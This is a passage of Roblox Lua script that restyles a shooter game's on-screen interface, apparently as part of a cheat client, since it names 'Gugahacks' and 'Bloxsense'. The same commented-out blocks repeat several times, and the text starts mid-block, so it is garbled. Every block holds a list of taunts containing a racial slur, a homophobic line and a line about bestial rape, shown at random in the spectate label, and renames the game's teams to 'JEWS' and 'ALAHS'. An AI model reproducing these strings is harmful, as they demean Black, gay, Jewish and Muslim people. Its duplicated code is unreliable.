	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

